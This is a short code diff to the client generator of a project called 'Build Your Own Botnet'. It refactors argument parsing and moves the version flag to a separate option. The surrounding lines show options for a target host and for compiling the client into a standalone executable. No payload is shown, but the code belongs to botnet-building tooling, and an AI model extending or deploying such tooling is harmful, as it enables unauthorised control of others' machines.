@@ -121,9 +121,10 @@ def main():
     """
     util.display(globals()['__banner'], color=random.choice(filter(lambda x: bool(str.isupper(x) and 'BLACK' not in x), dir(colorama.Fore))), style='normal')
 
-    parser = argparse.ArgumentParser(prog='client.py',
-                                    version='0.1.5',
-                                    description="Generator (Build Your Own Botnet)")
+    parser = argparse.ArgumentParser(
+        prog='client.py',
+        description="Generator (Build Your Own Botnet)"
+    )
 
     parser.add_argument('host',
                         action='store',
@@ -168,6 +169,12 @@ def main():
                         action='store_true',
                         help='compile client into a standalone executable for the current host platform',
                         default=False)
+
+    parser.add_argument(
+        '-v', '--version',
+        action='version',
+        version='0.2',
+    )
 
     options = parser.parse_args()
     key = base64.b64encode(os.urandom(16))
